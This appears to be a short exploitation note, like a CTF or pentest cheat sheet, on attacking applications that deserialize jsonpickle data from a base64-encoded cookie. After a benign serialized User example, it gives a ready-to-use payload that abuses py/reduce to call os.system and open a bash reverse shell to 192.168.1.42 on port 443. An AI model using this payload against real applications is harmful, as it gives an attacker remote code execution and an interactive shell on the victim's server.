“jsonpickle is a library for the two-way conversion of complex Python objects and JSON”
“jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON.”

example of unmodified string:
`{"py/object": "app.User", "username": "Poseidon"}`
`eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==`

Example payload: (needs to be base64 encoded in the cookie header)
`{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["bash -c 'exec bash -i &>/dev/tcp/192.168.1.42/443 <&1'"], 0, 0, 0]}`